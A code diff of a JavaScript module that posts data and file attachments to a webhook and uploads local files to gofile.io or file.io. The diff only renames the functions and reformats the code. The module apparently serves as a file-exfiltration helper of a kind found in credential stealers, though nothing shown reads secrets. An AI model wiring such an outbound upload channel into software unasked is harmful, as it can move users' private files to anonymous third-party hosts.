@@ -5,7 +5,7 @@ const FormData = require('form-data');
 const MAX_FILE_SIZE_MB = 8;
 const MAX_FILE_SIZE_BYTES = MAX_FILE_SIZE_MB * 1024 * 1024; 
 
-const webhook = async (webhookUrl, data, files = [], canary) => {
+const Webhook = async (webhookUrl, data, files = [], canary) => {
     const form = new FormData();
     let fileCount = 0;
 
@@ -22,9 +22,9 @@ const webhook = async (webhookUrl, data, files = [], canary) => {
     }
 
     if (fileCount > 10) {
-        await webhook(webhookUrl, data);
+        await Webhook(webhookUrl, data);
         for (let i = 0; i < fileCount; i++) {
-            await webhook(webhookUrl, {
+            await Webhook(webhookUrl, {
                 ...data,
                 content: `Attachment ${i + 1}: \`${files[i]}\``
             }, [files[i]]);
@@ -62,7 +62,7 @@ const webhook = async (webhookUrl, data, files = [], canary) => {
     }
 };
 
-const serverGofile = async () => {
+const ServerGofile = async () => {
     try {
         const response = await axios.get('https://api.gofile.io/servers', {}, {
             headers: {
@@ -79,15 +79,20 @@ const serverGofile = async () => {
         });
         if (response.data.status !== 'ok') return null;
         const servers = response.data.data.servers;
-        return servers[Math.floor(Math.random() * servers.length)].name;
+
+        return servers[
+            Math.floor(Math.random() * servers.length)
+        ].name;
     } catch (error) {
         return null;
     }
 };
 
-const uploadGofile = async (filePath, server) => {
+const UploadGofile = async (filePath, server) => {
     const form = new FormData();
+
     form.append('file', fs.createReadStream(filePath));
+    
     try {
         const response = await axios.post(`https://${server}.gofile.io/contents/uploadfile`, form, {
             headers: {
@@ -105,38 +110,43 @@ const uploadGofile = async (filePath, server) => {
             maxContentLength: Infinity,
             maxBodyLength: Infinity,
         });
+
         return response.data.data.downloadPage || null;
     } catch (error) {
         return null;
     }
 };
 
-const uploadFileio = async (filePath) => {
+const UploadFileio = async (filePath) => {
     const form = new FormData();
+
     form.append('file', fs.createReadStream(filePath));
     form.append('maxdownloads', '30');
+
     try {
         const response = await axios.post('https://file.io/', form, {
             headers: { 
                 ...form.getHeaders()
             },
         });
+
         return response.data.link || null;
     } catch (error) {
         return null;
     }
 };
 
-const upload = async (filePath) => {
+const Upload = async (filePath) => {
     let link = null;
+
     try {
-        const server = await serverGofile();
+        const server = await ServerGofile();
         if (server) {
-            link = await uploadGofile(filePath, server);
+            link = await UploadGofile(filePath, server);
         };
 
         if (!link) {
-            link = await uploadFileio(filePath);
+            link = await UploadFileio(filePath);
         };
 
         return link;
@@ -148,6 +158,6 @@ const upload = async (filePath) => {
 
 
 module.exports = {
-    webhook,
-    upload,
+    Webhook,
+    Upload,
 }
